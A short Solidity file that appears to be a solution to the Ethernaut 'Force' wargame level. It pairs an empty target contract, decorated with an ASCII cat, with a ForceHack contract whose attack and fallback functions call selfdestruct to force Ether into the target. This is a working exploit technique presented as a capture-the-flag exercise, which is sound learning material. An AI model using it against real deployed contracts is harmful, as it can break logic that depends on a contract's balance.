// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract ForceHack {

  Force public myForce;

    constructor(address ForceAdr) {
        myForce = Force(ForceAdr);
    }

    receive() external payable {}

    fallback() external payable {
        address payable addr = payable(address(myForce));
        selfdestruct(addr);
    }

    function attack() public payable {
        address payable addr = payable(address(myForce));
        selfdestruct(addr);
    }
}